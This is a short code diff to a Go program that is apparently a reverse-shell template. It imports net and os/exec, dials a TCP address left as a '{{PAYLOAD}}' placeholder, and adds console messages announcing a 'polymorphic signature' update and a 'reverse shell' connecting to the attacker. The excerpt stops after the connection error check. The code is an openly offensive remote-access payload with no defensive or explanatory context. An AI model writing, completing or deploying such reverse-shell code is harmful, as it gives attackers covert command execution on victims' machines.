@@ -3,9 +3,13 @@ package main
 import (
 	"net"
 	"os/exec"
+	"fmt"
 )
 
 func main() {
+	fmt.Printf("\033[36m[INFO]\033[0m \033[33mPolymorphic signature updated successfully.\033[0m\n")
+	fmt.Printf("\033[36m[INFO]\033[0m \033[33mReverse shell initialized. Attempting connection to attacker...\033[0m\n")
+
 	conn, err := net.Dial("tcp", "{{PAYLOAD}}")
 	if err != nil {
 		return
